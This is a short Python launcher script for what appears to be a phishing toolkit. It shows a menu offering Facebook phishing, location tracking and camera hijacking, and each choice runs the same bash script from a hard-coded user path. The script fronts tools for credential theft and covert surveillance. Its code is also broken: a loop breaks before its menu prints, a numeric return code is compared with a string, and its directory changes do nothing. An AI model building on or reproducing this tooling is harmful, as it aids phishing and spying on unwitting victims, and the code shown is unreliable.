from os import system as s
from time import sleep


s("clear")
sleep(2)


def pil(a):
   if a == 1:
      s("cd template")
      sleep(1)
      s("bash /home/bima020/phish-fb/template/main")
   elif a == 2:
       s("cd template")
       sleep(1)
       s("bash /home/bima020/phish-fb/template/main")
   elif a == 3:
        s("cd template")
        s("bash /home/bima020/phish-fb/template/main")

s("bash template/cek-root")
s("cd template")
if s("bash template/cek-root") == "Not root":
   while True:
     break 
     print ("""
     [1] phising fb-020
     [2] location track
     [3] camera hijacking
     """)
     pilih = int(input(">>"))
     pil(pilih)
else:
   print ("""
   [1] phising fb-020
   [2] location track
   [3] camera hijacking
   """)
   pilih = int(input(">>"))
   pil(pilih)






